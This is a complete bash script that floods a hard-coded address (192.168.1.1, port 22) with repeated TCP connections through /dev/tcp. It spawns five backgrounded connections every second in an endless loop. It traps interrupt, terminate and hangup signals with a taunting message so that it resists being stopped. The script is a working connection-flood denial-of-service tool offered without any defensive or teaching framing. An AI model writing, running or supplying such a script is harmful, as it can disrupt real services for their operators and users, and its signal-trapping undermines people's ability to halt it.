#!/bin/bash

# IP/Port to flood
IP=192.168.1.1
PORT=22
PROTOCOL=tcp

noooo() {
  echo "Why stop ? I want to keep on flooding :d"
}

trap noooo INT
trap noooo TERM
trap noooo HUP

tcp_flood() {
    ( ( sleep 10 5<> /dev/${PROTOCOL}/${IP}/${PORT}) & )
    ( ( sleep 10 6<> /dev/${PROTOCOL}/${IP}/${PORT}) & )
    ( ( sleep 10 7<> /dev/${PROTOCOL}/${IP}/${PORT}) & )
    ( ( sleep 10 8<> /dev/${PROTOCOL}/${IP}/${PORT}) & )
    ( ( sleep 10 9<> /dev/${PROTOCOL}/${IP}/${PORT}) & )
}

echo "Let's flood ${IP}:${PORT}"

while :
do
  ( ( tcp_flood ) & )
  sleep 1
done